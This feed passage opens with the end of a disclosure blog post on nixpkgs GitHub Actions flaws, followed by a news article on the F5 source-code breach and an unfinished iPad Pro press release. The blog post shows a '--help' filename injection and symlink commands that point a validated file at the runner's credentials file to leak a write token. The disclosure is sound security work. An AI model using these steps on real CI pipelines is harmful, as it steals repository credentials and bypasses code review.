</code></pre></div><p>the workflow would:</p><ol><li>get a list of files changed in the PR</li><li>checkout the PR code</li><li>run editorconfig-checker on those files</li></ol><p>the problem? it was using <code>xargs</code> to pass the filenames to editorconfig-checker. if you’ve read the <a href="https://man7.org/linux/man-pages/man1/xargs.1.html#:~:text=It%20is%20not%20possible%20for%20xargs%20to%20be%20used%20securely">man page for xargs</a>, you’ll see this warning:</p><blockquote><p>It is not possible for xargs to be used securely</p></blockquote><p>basically, we could create a file with a name that’s actually a command line argument. for example, if we added a file called <code>--help</code> to our PR, when the workflow ran <code>cat "$HOME/changed_files" | xargs -r editorconfig-checker</code>, the filename would be passed as an argument to editorconfig-checker, causing it to print its help message instead of checking files.</p><p><img src="https://ptrpa.ws/assets/images/posts/editor-config-run.png" alt="editor config run with help output"></p><p>this is a classic command injection vulnerability. we didn’t take it further to try to execute arbitrary code since editorconfig-checker is written in go and we’d need to audit it more deeply, but it’s most likely possible.</p><h2 id="the-code-owners-vulnerability-local-file-inclusion"> the code owners vulnerability: local file inclusion <a href="#the-code-owners-vulnerability-local-file-inclusion">#</a></h2><p>the second vulnerable workflow we found was even more serious. it was checking the CODEOWNERS file in PRs:</p><div><pre><code><span>steps</span><span>:</span>
  <span>-</span> <span>uses</span><span>:</span> <span>actions/checkout@eef61447b9ff4aafe5dcd4e0bbf</span>
    <span>with</span><span>:</span>
      <span>ref</span><span>:</span> <span>refs/pull/$/merge</span>
      <span>path</span><span>:</span> <span>pr</span>
  <span>-</span> <span>run</span><span>:</span> <span>nix-build base/ci -A codeownersValidator</span>
  <span>-</span> <span>run</span><span>:</span> <span>result/bin/codeowners-validator</span>
    <span>env</span><span>:</span>
      <span>OWNERS_FILE</span><span>:</span> <span>pr/ci/OWNERS</span>
</code></pre></div><p>the workflow would:</p><ol><li>checkout the PR code</li><li>build the codeowners validator</li><li>run the validator on the OWNERS file from the PR</li></ol><p>the validator would echo the contents of the OWNERS file if there was an error. this meant we could put whatever we wanted in that file and it would get printed in the logs.</p><p>but it gets worse. since the workflow was checking out our PR code, we could replace the OWNERS file with a symbolic link to ANY file on the runner. like, say, the github actions credentials file:</p><div><pre><code><span>$ </span><span>rm </span>OWNERS
<span>$ </span><span>ln</span> <span>-s</span> /home/runner/runners/2.320.0/.credentials OWNERS
</code></pre></div><p>when the validator ran, it would try to read our symlinked file and helpfully print out an error message containing the first line:</p><p><img src="https://ptrpa.ws/assets/images/posts/codeowners-error.png" alt="screenshot of error message including censored token"></p><p>and just like that, we had a github actions token with read/write access to nixpkgs. this would let us push directly to nixpkgs, bypassing all the normal review processes.</p><h2 id="the-fix"> the fix <a href="#the-fix">#</a></h2><p>after we found these vulnerabilities, we reported them to the nixpkgs maintainers, in this case infinisil, who immediately took action:</p><ol><li>they disabled the vulnerable workflows in the repos action settings</li><li>they fixed the vulnerabilities by properly separating untrusted data from privileged operations</li><li>they renamed the fixed workflows after the security fixes, this is because of another pitfall with <code>pull_request_target</code> allowing you to target any branch the action is on, even if it’s 5 or 10 years old as long as it hasn’t been disabled.</li></ol><p>the key lessons from this:</p><ul><li>avoid mixing untrusted data and secrets, or be very careful with them</li><li>only allow the permissions you really need</li><li>read the docs about permissions very carefully</li></ul><p>if you think your org has vulnerable github actions, you can use the panic button too:</p><ul><li>go to your org at https://github.com/[org]</li><li>go to the “Settings” tab</li><li>go to “Actions” → “General” section</li><li>under “Policies”, switch “All repositories” to “Disable”</li></ul><h2 id="conclusion"> conclusion <a href="#conclusion">#</a></h2><p>it only took us about a day to find, report, and help fix a vulnerability that could have compromised the entire nix ecosystem. this shows how important it is to be careful with github actions, especially when dealing with <code>pull_request_target</code>.</p><p>big thanks to intrigus and everyone at KITCTF (intrigus gave <a href="https://kitctf.de/learning/insecure-github-actions">a talk about exactly these issues</a> that taught us how this works), and thanks to infinisil for fixing this on the same day we reported it.</p><p>if you want to learn more, check out these resources:</p><ul><li><a href="https://kitctf.de/talks/2023-10-26-insecure-github-actions/insecure-github-actions.pdf]">https://kitctf.de/talks/2023-10-26-insecure-github-actions/insecure-github-actions.pdf</a></li><li><a href="https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/">https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/</a></li><li><a href="https://github.com/NixOS/nixpkgs/pull/351446">https://github.com/NixOS/nixpkgs/pull/351446</a></li></ul><p>also, if you’re curious, you can watch <a href="https://youtube.com/live/_7wqXN-7ebw?t=38450s">our original lightning talk</a> from nixcon</p><p>anyway that’s all. stay safe with your github actions. meow :3</p></section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[F5 says hackers stole undisclosed BIG-IP flaws, source code (148 pts)]]></title>
            <link>https://www.bleepingcomputer.com/news/security/f5-says-hackers-stole-undisclosed-big-ip-flaws-source-code/</link>
            <guid>45592271</guid>
            <pubDate>Wed, 15 Oct 2025 13:33:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.bleepingcomputer.com/news/security/f5-says-hackers-stole-undisclosed-big-ip-flaws-source-code/">https://www.bleepingcomputer.com/news/security/f5-says-hackers-stole-undisclosed-big-ip-flaws-source-code/</a>, See on <a href="https://news.ycombinator.com/item?id=45592271">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
	   
<p><img alt="F5" height="900" src="https://www.bleepstatic.com/content/hl-images/2025/10/15/F5.jpg" width="1600"></p>

<p>U.S. cybersecurity company F5 disclosed that nation-state&nbsp;hackers breached its systems and stole undisclosed BIG-IP security vulnerabilities and source code.</p>

<p>The company states that it first became aware of the breach&nbsp;on August 9, 2025, with its&nbsp;investigations revealing that the attackers had gained long-term access to its system, including the company's BIG-IP product development environment and engineering knowledge management platform.</p>

<p>F5 is a Fortune 500 tech giant specializing in cybersecurity, cloud management, and application delivery networking (ADN) applications. The company has 23,000 customers in 170 countries, and 48 of the Fortune 50 entities use its products.</p>

<p>BIG-IP is the firm's flagship product used for application delivery&nbsp;and traffic management by many large enterprises worldwide.</p>

<h3>No supply-chain risk</h3>

<p>It’s unclear how long the hackers maintained access, but the company confirmed that they&nbsp;stole source code, vulnerability data, and some&nbsp;configuration and implementation details for a limited number of customers.</p>

<p>"Through this access, certain files were exfiltrated, some of which contained certain portions of the Company's BIG-IP source code and information about undisclosed vulnerabilities that it was working on in BIG-IP," the company <a href="https://my.f5.com/manage/s/article/K000154696" target="_blank" rel="nofollow noopener">states</a>.</p>

<p>Despite this critical exposure of undisclosed flaws, F5 says there's no evidence that the attackers leveraged the information in actual attacks, such as exploiting&nbsp;the undisclosed flaw against systems. The company also states that it has not seen evidence that the private information has been disclosed.</p>

<p>F5 claims that the threat actors' access to the BIG-IP environment did not compromise its software supply chain or result in any suspicious code modifications.</p>

<p>This includes its platforms that contain customer data, such as its CRM, financial, support case management, or iHealth systems. Furthermore, other products and platforms managed by the company are not compromised, including NGINX, F5 Distributed Cloud Services, or Silverline systems' source code.</p>

<h3>Response to the breach</h3>

<p>After discovering the intrusion, F5 took remediation action by tightening access to its systems, and improving&nbsp;its overall threat monitoring, detection, and response capabilities:</p>

<ul lwc-4nfn2rc40ch=""><li lwc-4nfn2rc40ch="">Rotated credentials and strengthened access controls across our systems.</li>
	<li lwc-4nfn2rc40ch="">Deployed improved inventory and patch management automation, as well as additional tooling to better monitor, detect, and respond to threats.</li>
	<li lwc-4nfn2rc40ch="">Implemented enhancements to our network security architecture.</li>
	<li lwc-4nfn2rc40ch="">Hardened our product development environment, including strengthening security controls and monitoring of all software development platforms.</li>
</ul><p>Additionally, the company also focuses&nbsp;on the security of its products through source code reviews and security assessements&nbsp;with support from NCC Group and IOActive.</p>

<p>NCC Group's <a href="http://raw.githubusercontent.com/askf5/K000154696/main/NCC_Group_Bedrock_Letter_of_Engagement_Oct_10_2025_1.pdf" target="_blank" rel="nofollow noopener">assessment covered security reviews</a> of critical software components in BIG-IP and portions of the development pipeline in an effort that involved 76 consultants.</p>

<p>IOActive's expertise was called in after the security breach and the <a href="http://raw.githubusercontent.com/askf5/K000154696/main/IOActive_Security_Review_2025_Attestation_Letter.pdf" target="_blank" rel="nofollow noopener">engagement is still in progress</a>. The results so far show no evidence of the threat actor introducing vulnerablities in critical F5 software source code or&nbsp;the software development build pipeline.</p>

<h3>Customers should take action</h3>

<p>F5 is still reviewing which customers had their configuration or implementation details stolen and will contact them with guidance.</p>

<p>To help customers secure their F5 environments against risks stemming from the breach, the company released updates for&nbsp;&nbsp;BIG-IP, F5OS, BIG-IP Next for Kubernetes, BIG-IQ, and APM clients.</p>

<p>Despite any evidence "of undisclosed critical or remote code execution vulnerabilities," the company urges customers to prioritize installing the <a href="https://www.bleepingcomputer.com/news/security/f5-releases-big-ip-patches-for-stolen-security-vulnerabilities/" target="_blank" rel="nofollow noopener">new BIG-IP software updates</a>.</p>

<p>F5 confirmed that today's updates address the potential impact stemming from the stolen undisclosed vulnerabilities.</p>

<p>Furthermore, F5 support makes available a threat hunting guide for customers to improve detection and monitoring in their environment.</p>

<p>New&nbsp;best practices for hardening F5 systems now include automated checks to the&nbsp;<a href="https://www.f5.com/support/big-ip-ihealth-diagnostic-tool" lwc-4nfn2rc40ch="" target="_blank" rel="nofollow noopener">F5 iHealth Diagnostic Tool</a>, which can now&nbsp;flag&nbsp;security risks, vulnerabilities, prioritize&nbsp;actions, and provide remediation guidance.</p>

<p>Another recommendation is to enable&nbsp;BIG-IP event streaming to&nbsp;SIEM and configure the systems to <a href="https://my.f5.com/manage/s/article/K13080" target="_blank" rel="nofollow noopener">log to a remote syslog server</a> and <a href="https://my.f5.com/manage/s/article/K13426" target="_blank" rel="nofollow noopener">monitor for login attempts</a>.</p>

<p>"Our global support team is available to assist. You can open a MyF5 support case or contact F5 support directly for help updating your BIG-IP software, implementing any of these steps, or to address any questions you may have" - <a href="https://my.f5.com/manage/s/article/K000154696" target="_blank" rel="nofollow noopener">F5</a></p>

<p>The company added that it has validated the safety of BIG-IP releases through multiple independent reviews by leading cybersecurity firms, including CrowdStrike and Mandiant.</p>

<p>On Monday, F5 announced that it <a href="https://my.f5.com/manage/s/article/K000157005" target="_blank" rel="nofollow noopener">rotated the cryptographic certcertificates and keys</a> used for signing its digital products. The change affects installing&nbsp;BIG-IP and BIG-IQ TMOS software images while ISO image signature verification is enabled, and installing&nbsp;BIG-IP F5OS tenant images on host systems running F5OS.</p>

<p>Additional guidance for F5 customers comes from&nbsp;UK's National Cyber Security Centre (NCSC) and the U.S. Cybersecurity and Infrastructure Security Agency (CISA).</p>

<p>Both agencies recommmend&nbsp;identifying all F5 products (hardware, software, and virtualized) and making sure that no management interface is exposed on the public web. If an exposed interface is discovered, companies should make compromise assessment.</p>

<p>F5 notes that it delayed the public disclosure of the incident at the U.S. government's request, presumably to allow enough time to secure critical systems.</p>

<p>"On September 12, 2025, the U.S. Department of Justice determined that a delay in public disclosure was warranted pursuant to Item 1.05(c) of Form 8-K. F5 is now filing this report in a timely manner," explains F5.</p>

<p>F5 states that the incident has no material impact on its operations. All services remain available and are considered safe, based on the latest available evidence.</p>

<p>BleepingComputer has contacted F5 to request more details about the incident, and we will update this post when we receive a response.</p>

	   


<div>
    <p><a href="https://hubs.li/Q03LvVKm0" target="_blank" rel="noopener sponsored">
            <img src="https://www.bleepstatic.com/c/p/picus/bas-summit.jpg" alt="Picus BAS Summit">
        </a>
    </p>
    <div>
        <h2><a href="https://hubs.li/Q03LvVKm0" target="_blank" rel="noopener sponsored">The Security Validation Event of the Year: The Picus BAS Summit </a></h2>
<p>Join the <strong>Breach and Attack Simulation Summit</strong> and experience the <strong>future of security validation</strong>. Hear from top experts and see how <strong>AI-powered BAS</strong> is transforming breach and attack simulation.</p>
<p>Don't miss the event that will shape the future of your security strategy</p>
        </div>
</div>

           
          
 
	  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[iPad Pro with M5 chip (194 pts)]]></title>
            <link>https://www.apple.com/newsroom/2025/10/apple-introduces-the-powerful-new-ipad-pro-with-the-m5-chip/</link>
            <guid>45591905</guid>
            <pubDate>Wed, 15 Oct 2025 13:10:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.apple.com/newsroom/2025/10/apple-introduces-the-powerful-new-ipad-pro-with-the-m5-chip/">https://www.apple.com/newsroom/2025/10/apple-introduces-the-powerful-new-ipad-pro-with-the-m5-chip/</a>, See on <a href="https://news.ycombinator.com/item?id=45591905">Hacker News</a></p>
<div id="readability-page-1" class="page">


	
    







 
<nav id="ac-localnav" lang="en-US" role="navigation" aria-label="Newsroom" data-analytics-region="local nav" data-sticky="">
	
    
    
        




    
    
    
	
	

</nav>





<main id="main" role="main"> 




<span id="opens-in-new-window">opens in new window</span>
<section>
<article data-analytics-activitymap-region-id="article">






    
    
    









    





    <div>
        
		
        <div>
                    
                    
                        <span>PRESS RELEASE</span>
                    
                    
                        <span>October 15, 2025</span>
                    
                    
                </div>

        <div>
                
                
                
                    <h2>
                        
    
        Apple introduces the powerful new iPad Pro with the M5 chip
    

                    </h2>
                
            </div>

        <div>
                
                
                    The new iPad Pro features the next generation of Apple silicon, with a big leap in AI performance, faster storage, and the game-changing capabilities of iPadOS 26
                
            </div>

        
            
    
    
    
    
    

        

    </div>







    
    
    






  
    
    
    
    
      <figure aria-label="Media, A close-up of the new iPad Pro with M5.">
        <div>
             
              
              <div>
                With the M5 chip, the new iPad Pro delivers a huge boost in performance and takes the next big leap in AI for iPad.
              </div>
            
            
            
            
            <a href="https://www.apple.com/newsroom/images/2025/10/apple-introduces-the-powerful-new-ipad-pro-with-the-m5-chip/article/Apple-iPad-Pro-hero-251015.zip" download="" data-analytics-title="download image - Apple-iPad-Pro-hero-251015_big" aria-label="Download media, A close-up of the new iPad Pro with M5."></a>
          </div>
      </figure>
    
  








    
    
    


     
     
    
    
        <div>
             
                 <div><span>CUPERTINO, CALIFORNIA</span> Apple today introduced the new <a href="https://www.apple.com/ipad-pro/" target="_blank">iPad Pro</a> featuring the incredibly powerful M5 chip. M5 unlocks the most advanced iPad experience ever, packing an incredible amount of power and AI performance into the ultraportable design of iPad Pro. Featuring a next-generation GPU with a Neural Accelerator in each core, M5 delivers a big boost in performance for iPad Pro users, whether they’re working on cutting-edge projects or tapping into AI for productivity. The new iPad Pro delivers up to 3.5x the AI performance than iPad Pro with M4<sup>1</sup> and up to 5.6x faster than iPad Pro with M1.<sup>2</sup> N1, the new Apple-designed wireless networking chip, enables the latest generation of wireless technologies with support for Wi-Fi 7 on iPad Pro. The C1X modem comes to cellular models of iPad Pro, delivering up to 50 percent faster cellular data performance than its predecessor with even greater efficiency, allowing users to do more on the go. Available in space black and silver, iPad Pro comes in 11-inch and 13-inch sizes, and features the Ultra Retina XDR display for an unparalleled viewing experience. The game-changing features of iPadOS 26 supercharge iPad Pro and help users handle demanding creative and professional tasks with ease. With staggering performance gains and breakthrough improvements over M1 models, there has never been a better time to upgrade. The new iPad Pro is available to pre-order starting today, and will be available in stores beginning Wednesday, October 22.
</div>
                 
             
                 <div>“Powered by the next generation of Apple silicon, the new iPad Pro delivers our most advanced and versatile iPad experience yet,” said John Ternus, Apple’s senior vice president of Hardware Engineering. “iPad Pro with M5 unlocks endless possibilities for creativity and productivity — with a huge leap in AI performance and a big boost in graphics, superfast wireless connectivity, and game-changing iPadOS 26 features, it pushes the boundaries of what iPad can do yet again.”
</div>
                 
             
         </div>
 

    
    
    






  
    
    
    
    
      <figure aria-label="Media, A passenger in the back of a car looks at the new iPad Pro with M5 on the go.">
        <div>
             
              
              <div>
                The new iPad Pro with M5 unlocks the most advanced iPad experience ever, packing an incredible amount of power and AI performance into the ultraportable design.
              </div>
            
            
            
            
            <a href="https://www.apple.com/newsroom/images/2025/10/apple-introduces-the-powerful-new-ipad-pro-with-the-m5-chip/article/Apple-iPad-Pro-lifestyle-251015.zip" download="" data-analytics-title="download image - Apple-iPad-Pro-lifestyle-251015_big" aria-label="Download media, A passenger in the back of a car looks at the new iPad Pro with M5 on the go."></a>
          </div>
      </figure>
    
  








    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>M5: The Next Big Leap in AI for iPad</strong>
</h2>
                 
             
                 <div>Apple silicon continues to set iPad apart with industry-leading performance, advanced technologies, power efficiency, and AI capabilities. With the M5 chip powering iPad Pro, AI on iPad takes its next big leap, with a more advanced GPU and CPU, and a faster Neural Engine. The 10-core GPU introduces a new architecture with a Neural Accelerator in each core, resulting in a massive boost in GPU performance for AI workloads. M5 delivers AI performance that’s up to 3.5x faster compared to M4,<sup>1</sup> and up to 5.6x faster than iPad Pro with M1.<sup>2</sup> The new iPad Pro is designed for AI and accelerates a wide variety of workloads, such as on-device diffusion-based image generation in apps like Draw Things, and AI video masking in apps like DaVinci Resolve. And the faster 16-core Neural Engine delivers the most energy-efficient performance for on-device AI, perfect for apps that use the Foundation Models framework and for Apple Intelligence features like creating in Image Playground.<sup>3</sup>
</div>
                 
             
         </div>
 

    
    
    






  
    
    
    
    
      <figure aria-label="Media, The Draw Things app is shown on iPad Pro with M5.">
        <div>
             
              
              <div>
                The new iPad Pro with M5 delivers up to 3.5x faster AI performance than iPad Pro with M4, and up to 5.6x the AI performance than iPad Pro with M1 for tasks such as image generation and AI video masking in apps like Draw Things.
              </div>
            
            
            
            
            <a href="https://www.apple.com/newsroom/images/2025/10/apple-introduces-the-powerful-new-ipad-pro-with-the-m5-chip/article/Apple-iPad-Pro-Draw-Things-251015.zip" download="" data-analytics-title="download image - Apple-iPad-Pro-Draw-Things-251015_big" aria-label="Download media, The Draw Things app is shown on iPad Pro with M5."></a>
          </div>
      </figure>
    
  








    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>Next-Level Performance with M5</strong>
</h2>
                 
             
                 <div>The M5 chip brings next-level performance, with a significant boost to graphics performance and a faster CPU. Incorporating a third-generation ray-tracing engine enabling more realistic lighting, reflections, and shadows — M5 is ideal for visually intensive applications and gaming — iPad Pro has up to 1.5x faster 3D rendering with ray tracing than the previous-generation iPad Pro,<sup>1</sup> and up to a whopping 6.7x faster rendering performance than iPad Pro with M1.<sup>2</sup> M5 has up to a 10-core CPU, with four performance cores and six efficiency cores, and is the world’s fastest CPU core. The faster CPU is perfect for a range of users, including graphic designers working with complex vector graphics in apps like Adobe Illustrator, architects who routinely multitask across apps like SketchUp and Morpholio Trace, and business users who need to quickly launch and access large files across multiple apps.
</div>
                 
             
                 <div>iPad Pro with M5 delivers:
</div>
                 
             
                 <div><ul>
<li>Up to 6.7x faster 3D rendering with ray tracing in Octane X when compared to iPad Pro with M1,<sup>2</sup> and up to 1.5x faster than iPad Pro with M4.<sup>1</sup></li>
</ul>
</div>
                 
             
                 <div><ul>
<li>Up to 6x faster video transcode performance in Final Cut Pro for iPad when compared to iPad Pro with M1,<sup>2</sup> and up to 1.2x faster than iPad Pro with M4.<sup>1</sup></li>
</ul>
</div>
                 
             
                 <div><ul>
<li>Up to 4x faster AI image generation performance in Draw Things for iPad when compared to iPad Pro with M1,<sup>2</sup> and up to 2x faster than iPad Pro with M4.<sup>1</sup></li>
</ul>
</div>
                 
             
                 <div><ul>
<li>Up to 3.7x faster AI video upscaling performance in DaVinci Resolve for iPad when compared to iPad Pro with M1,<sup>2</sup> and up to 2.3x faster than iPad Pro with M4.<sup>1</sup></li>
</ul>
</div>
                 
             
         </div>
 

    
    
    






  
    
    
    
    
      <figure aria-label="Media, A close-up of the advanced graphics performance in Octane X on the new iPad Pro with M5.">
        <div>
             
              
              <div>
                The new iPad Pro incorporates a third-generation ray-tracing engine for superfast 3D rendering in apps like Octane X.
              </div>
            
            
            
            
            <a href="https://www.apple.com/newsroom/images/2025/10/apple-introduces-the-powerful-new-ipad-pro-with-the-m5-chip/article/Apple-iPad-Pro-graphics-performance-251015.zip" download="" data-analytics-title="download image - Apple-iPad-Pro-graphics-performance-251015_big" aria-label="Download media, A close-up of the advanced graphics performance in Octane X on the new iPad Pro with M5."></a>
          </div>
      </figure>
    
  








    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>Faster Memory Bandwidth and Storage for More Seamless Multitasking</strong>
</h2>
                 
             
                 <div>iPad Pro brings new enhancements to accelerate overall speed and responsiveness, including an increase in unified memory bandwidth, faster storage read and write speeds, more starting unified memory, and fast charge support. With over 150GB/s of unified memory bandwidth — a nearly 30 percent increase compared to the previous generation — the new iPad Pro helps users multitask across more apps, process AI models faster, play demanding games, and more. The new iPad Pro offers up to 2x faster storage read and write speeds, and the 256GB and 512GB models start with 12GB of unified memory — 50 percent more than before, bringing even more value. And with the new windowing system in iPadOS 26, iPad Pro users will experience more seamless multitasking, enhancing even the most complex workflows. Additionally, iPad Pro supports fast charge — enabling up to a 50 percent charge in around 30 minutes<sup>4</sup> with an optional high-wattage USB-C power adapter like Apple’s new 40W Dynamic Power Adapter with 60W Max.<sup>5</sup>
</div>
                 
             
         </div>
 

    
    
    






  
    
    
    
    
      <figure aria-label="Media, Gameplay from Arknights: Endfield on the new iPad Pro with M5.">
        <div>
             
              
              <div>
                With an increase in unified memory bandwidth, iPad Pro helps users play demanding games like Arknights: Endfield, multitask across more apps, process AI models faster, and more.
              </div>
            
            
            
            
            <a href="https://www.apple.com/newsroom/images/2025/10/apple-introduces-the-powerful-new-ipad-pro-with-the-m5-chip/article/Apple-iPad-Pro-gaming-Arknights-Endfield-251015.zip" download="" data-analytics-title="download image - Apple-iPad-Pro-gaming-Arknights-Endfield-251015_big" aria-label="Download media, Gameplay from Arknights: Endfield on the new iPad Pro with M5."></a>
          </div>
      </figure>
    
  








    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>The C1X and N1 Chips Come to iPad</strong>
</h2>
                 
             
                 <div>Cellular models of iPad Pro feature C1X, a cellular modem designed by Apple that brings users up to 50 percent faster cellular data performance, and for active cellular users, up to 30 percent less power usage than iPad Pro with M4. Cellular models of iPad Pro allow users to enjoy GPS and location capabilities, so they can navigate with even more confidence. Users can also enjoy 5G cellular support, so they can stay connected for work or leisure all around the world. And with eSIM, users can quickly and securely add a new plan, connect and transfer existing cellular plans digitally, and stay in touch with family and friends regardless of Wi-Fi availability — perfect for users working on the go, like frequent business travelers or architects out in the field.
</div>
                 
             
                 <div>The new iPad Pro also features N1, a new Apple-designed wireless networking chip that enables Wi-Fi 7, Bluetooth 6, and Thread. N1 brings better performance when connected to 5GHz networks, and improves the overall performance and reliability of features like Personal Hotspot and AirDrop.
</div>
                 
             
         </div>
 

    
    
    






  
    
    
    
    
      <figure aria-label="Media, The new iPad Pro with M5 shows a FaceTime call.">
        <div>
             
              
              <div>
                The Apple N1 wireless networking chip and Apple C1X modem come to iPad Pro for the first time.
              </div>
            
            
            
            
            <a href="https://www.apple.com/newsroom/images/2025/10/apple-introduces-the-powerful-new-ipad-pro-with-the-m5-chip/article/Apple-iPad-Pro-Wi-Fi-251015.zip" download="" data-analytics-title="download image - Apple-iPad-Pro-Wi-Fi-251015_big" aria-label="Download media, The new iPad Pro with M5 shows a FaceTime call."></a>
          </div>
      </figure>
    
  








    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>An Unrivaled Design and Display</strong>
</h2>
                 
             
                 <div>iPad Pro offers users the ultimate level of portability in a stunningly thin and light design. Available in space black and silver, the 11-inch model is just 5.3 mm thin, and the 13-inch model is even thinner at a striking 5.1 mm. The Ultra Retina XDR display — the world’s most advanced display — features groundbreaking tandem OLED technology that delivers extreme brightness, incredibly precise contrast, and technologies like ProMotion and True Tone. iPad Pro supports 1000 nits of full-screen brightness for SDR and HDR content, and 1600 nits peak brightness for HDR. And for users who work with high-end, color-managed workflows or in challenging lighting conditions, iPad Pro offers a nano-texture display glass option for reduced glare that is precisely etched at a nanometer scale, maintaining image quality and contrast while scattering ambient light.
</div>
                 
             
         </div>
 

    
    
    


    
    
        
        
        
            <div role="group" aria-label="gallery" data-component-list="MixinGallery" id="ipad-pro-with-m5-design-and-display">
            <nav role="presentation">
                <ul role="tablist">
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-ded2be7d177af15f02e7ea8ffb0ffc3f" href="#gallery-ded2be7d177af15f02e7ea8ffb0ffc3f" data-ac-gallery-trigger="gallery-ded2be7d177af15f02e7ea8ffb0ffc3f"><span>The new iPad Pro is shown in space black and silver.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-043b7fa86956d3b59b6b3a6e42f9b99b" href="#gallery-043b7fa86956d3b59b6b3a6e42f9b99b" data-ac-gallery-trigger="gallery-043b7fa86956d3b59b6b3a6e42f9b99b"><span>The 11-inch and 13-inch iPad Pro with M5 models are shown from the side to emphasize their thinness.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-b3c2d56d9160b0d43fb4e5722933cf8d" href="#gallery-b3c2d56d9160b0d43fb4e5722933cf8d" data-ac-gallery-trigger="gallery-b3c2d56d9160b0d43fb4e5722933cf8d"><span>The Ultra Retina XDR display on the new iPad Pro.</span></a>
                        </li>
                    
                </ul>
            </nav>
            <div>
                
                    
                        
                        <div id="gallery-ded2be7d177af15f02e7ea8ffb0ffc3f" aria-labelledby="gallery-dotnav-ded2be7d177af15f02e7ea8ffb0ffc3f" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:colors">
                                
                                <div>
                                    <div>The new iPad Pro is available in space black and silver.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-introduces-the-powerful-new-ipad-pro-with-the-m5-chip/article/Apple-iPad-Pro-color-lineups-251015.zip" download="" data-analytics-title="download image - Apple-iPad-Pro-color-lineups-251015_inline" aria-label="Download media, The new iPad Pro is shown in space black and silver."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-043b7fa86956d3b59b6b3a6e42f9b99b" aria-labelledby="gallery-dotnav-043b7fa86956d3b59b6b3a6e42f9b99b" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:thinness">
                                
                                <div>
                                    <div>iPad Pro is incredibly portable. The 11-inch model is just 5.3 mm thin, and the 13-inch model is even thinner at a striking 5.1 mm.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-introduces-the-powerful-new-ipad-pro-with-the-m5-chip/article/Apple-iPad-Pro-thin-design-251015.zip" download="" data-analytics-title="download image - Apple-iPad-Pro-thin-design-251015_inline" aria-label="Download media, The 11-inch and 13-inch iPad Pro with M5 models are shown from the side to emphasize their thinness."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-b3c2d56d9160b0d43fb4e5722933cf8d" aria-labelledby="gallery-dotnav-b3c2d56d9160b0d43fb4e5722933cf8d" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:ultra-retina-xdr">
                                
                                <div>
                                    <div>iPad Pro features the breathtaking Ultra Retina XDR display with state-of-the-art tandem OLED technology, providing a remarkable visual experience.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/10/apple-introduces-the-powerful-new-ipad-pro-with-the-m5-chip/article/Apple-iPad-Pro-Ultra-Retina-XDR-251015.zip" download="" data-analytics-title="download image - Apple-iPad-Pro-Ultra-Retina-XDR-251015_inline" aria-label="Download media, The Ultra Retina XDR display on the new iPad Pro."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
            </div>
            
                
                
                <nav role="presentation">
                    
                        <ul>
                            <li>
                                
                            </li>
                            <li>
                                
                            </li>
                        </ul>
                    
                </nav>
            
        </div>
    


    
    
    


     
     
    
    
        <div>The new iPad Pro adds the ability to drive external displays at up to 120Hz — ideal for creative workflows like video editing as well as gaming. And for users with a 120Hz external display, iPad Pro also brings new support for Adaptive Sync, which provides the lowest possible latency in external display performance, resulting in smoother motion and fewer perceived glitches, useful for low-latency use cases like gaming.
</div>
 

    
    
    






  
    
    
    
    
      <figure aria-label="Media, A user works on an external display connected to the new iPad Pro with M5.">
        <div>
             
              
              <div>
                iPad Pro and iPadOS 26 bring even greater capability to drive external displays, now at a refresh rate of up to 120Hz.
              </div>
            
            
            
            
            <a href="https://www.apple.com/newsroom/images/2025/10/apple-introduces-the-powerful-new-ipad-pro-with-the-m5-chip/article/Apple-iPad-Pro-external-display-251015.zip" download="" data-analytics-title="download image - Apple-iPad-Pro-external-display-251015_big" aria-label="Download media, A user works on an external display connected to the new iPad Pro with M5."></a>
          </div>
      </figure>
    
  








    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>iPadOS 26 Supercharges the iPad Experience</strong>
</h2>
                 
             
                 <div>iPadOS 26 introduces a new design and powerful features that help users handle demanding creative and professional tasks with ease, and push the capabilities and versatility of iPad even further.
</div>
                 
             
                 <div><ul>
<li>The beautiful new design is crafted with <strong>Liquid Glass</strong>, a translucent new material that reflects and refracts its surroundings, while reacting to users’ input and dynamically transforming to bring greater focus to the content they care about most.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>An entirely new, powerful, and intuitive <strong>windowing system</strong> helps users control, organize, and switch between apps, all while maintaining the simplicity of iPad. And with a new <strong>menu bar</strong>, users can access the commands available in an app with a simple swipe down from the top of the display, or by moving their cursor to the top.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>iPadOS 26 introduces new ways to manage, access, and organize files with a supercharged <strong>Files app</strong> featuring an updated List view and new folder customization options. With <strong>folders in the Dock</strong>, users can conveniently access downloads, documents, and more from anywhere. Additionally, users can set a default app for opening specific files or file types.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>The <strong>Preview app</strong> comes to iPad, giving users a dedicated app to view and edit PDFs, with powerful features like Apple Pencil Markup and AutoFill built in.</li>
</ul>
</div>
                 
             
                 <div><ul>
